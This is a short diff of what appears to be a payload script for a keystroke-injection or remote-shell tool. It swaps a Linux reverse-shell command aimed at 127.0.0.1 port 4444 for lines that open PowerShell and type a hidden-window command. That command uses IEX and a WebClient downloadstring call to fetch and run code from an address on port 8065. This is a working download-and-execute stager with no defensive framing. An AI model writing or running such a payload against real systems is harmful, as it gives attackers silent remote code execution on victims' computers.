@@ -1,3 +1,4 @@
 set Time 1
-LINUX_OPENSHELL
-LINUX_RESHELL 127.0.0.1 4444
+POWERSHELL
+TOGGLE_INPUT
+ECHO Start-Process -WindowStyle Hidden powershell.exe -ArgumentList '-NoProfile', '-Command',  'IEX ((new-object net.webclient).downloadstring(''http://192.168.56.1:8065/a''))'
